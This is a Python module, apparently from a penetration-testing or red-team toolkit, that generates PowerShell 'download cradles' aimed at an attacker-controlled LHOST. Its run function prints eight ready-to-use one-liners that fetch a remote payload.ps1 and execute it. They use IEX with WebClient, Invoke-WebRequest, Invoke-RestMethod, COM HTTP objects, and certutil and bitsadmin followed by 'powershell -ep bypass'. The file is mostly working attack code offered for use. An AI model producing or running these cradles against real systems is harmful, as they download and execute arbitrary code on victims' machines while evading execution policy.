"""PowerShell download cradles — IEX, WebClient, COM objects, certutil pipe."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.evasion.ps_cradle.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["file_download", "code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1059.001"],
}


def run(args: Any) -> int:
    lhost = getattr(args, "lhost", None) or getattr(args, "target", None) or "LHOST"
    lport = getattr(args, "lport", "8080") if hasattr(args, "lport") else "8080"
    url = "http://{}:{}/payload.ps1".format(lhost, lport)

    print("[*] PowerShell Download Cradles")

    cradles = {
        "iex_webclient": "IEX(New-Object Net.WebClient).DownloadString('{}')".format(url),
        "iex_iwr": "IEX(IWR -Uri '{}' -UseBasicParsing).Content".format(url),
        "iex_restmethod": "IEX(Invoke-RestMethod '{}')".format(url),
        "com_xmlhttp": "$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','{}',0);$h.send();IEX $h.responseText".format(url),
        "com_winhttprequest": "$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.open('GET','{}',0);$h.send();IEX $h.responseText".format(url),
        "certutil_pipe": "certutil -urlcache -split -f {} C:\\Windows\\Temp\\p.ps1 && powershell -ep bypass C:\\Windows\\Temp\\p.ps1".format(url),
        "bitsadmin_pipe": "bitsadmin /transfer j http://{}:{}/p.ps1 C:\\Windows\\Temp\\p.ps1 && powershell -ep bypass C:\\Windows\\Temp\\p.ps1".format(lhost, lport),
        "base64_encoded": "powershell -enc <BASE64_OF_SCRIPT>",
    }

    for name, cradle in cradles.items():
        print("\n  [{}]".format(name))
        print("  {}".format(cradle))

    return 0
